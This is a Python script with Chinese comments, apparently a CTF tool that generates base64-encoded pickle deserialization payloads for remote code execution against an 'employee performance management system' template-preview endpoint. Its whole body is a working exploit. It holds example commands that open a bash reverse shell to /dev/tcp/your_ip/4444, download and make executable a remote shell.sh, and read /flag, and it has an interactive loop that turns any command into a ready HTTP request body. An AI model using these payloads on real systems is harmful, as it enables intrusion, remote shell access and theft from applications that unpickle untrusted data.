#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTF题目 Payload 生成工具
用于生成 pickle 反序列化攻击载荷
"""

import pickle
import base64
import os
import subprocess

class RCEPayload:
    """
    远程代码执行payload类
    利用pickle反序列化漏洞
    """
    
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        # 这里是关键：当pickle反序列化时会调用__reduce__方法
        # 返回一个可调用对象和参数，实现任意代码执行
        return (os.system, (self.command,))

def generate_payload(command):
    """
    生成pickle序列化的恶意payload
    
    Args:
        command (str): 要执行的系统命令
        
    Returns:
        str: base64编码的pickle payload
    """
    # 创建恶意对象
    payload_obj = RCEPayload(command)
    
    # 序列化对象
    pickled = pickle.dumps(payload_obj)
    
    # base64编码
    encoded = base64.b64encode(pickled).decode('utf-8')
    
    return encoded

def create_exploit_examples():
    """创建多种攻击场景的示例payload"""
    
    examples = {
        "读取flag文件": "cat /flag",
        "列出根目录": "ls -la /",
        "查看当前目录": "pwd && ls -la",
        "反弹shell": "bash -c 'bash -i >& /dev/tcp/your_ip/4444 0>&1'",
        "创建测试文件": "echo 'CTF_PWN_SUCCESS' > /tmp/pwned.txt",
        "获取系统信息": "uname -a && whoami && id",
        "查看网络连接": "netstat -tlnp",
        "下载远程文件": "wget http://your_server/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh"
    }
    
    print("=== CTF 题目攻击载荷生成器 ===\n")
    print("漏洞类型: Python Pickle 反序列化 RCE")
    print("目标系统: 员工绩效管理系统")
    print("攻击路径: /admin/templates/preview (需要管理员权限)\n")
    
    for desc, cmd in examples.items():
        payload = generate_payload(cmd)
        print(f"【{desc}】")
        print(f"命令: {cmd}")
        print(f"Payload: pickle:{payload}")
        print(f"完整请求体:")
        print(f"""{{
  "content": "测试模板内容 {{{{test_var}}}}",
  "variables": "pickle:{payload}"
}}""")
        print("-" * 80)

def main():
    """主函数"""
    create_exploit_examples()
    
    print("\n=== 自定义Payload生成 ===")
    while True:
        try:
            cmd = input("\n输入要执行的命令 (输入 'quit' 退出): ")
            if cmd.lower() in ['quit', 'exit', 'q']:
                break
            
            if cmd.strip():
                payload = generate_payload(cmd)
                print(f"\n生成的Payload:")
                print(f"pickle:{payload}")
                print(f"\n用于HTTP请求的JSON:")
                print(f"""{{
  "content": "模板内容 {{{{var}}}}",
  "variables": "pickle:{payload}"
}}""")
        except KeyboardInterrupt:
            print("\n\n退出...")
            break
        except Exception as e:
            print(f"错误: {e}")

if __name__ == "__main__":
    main() 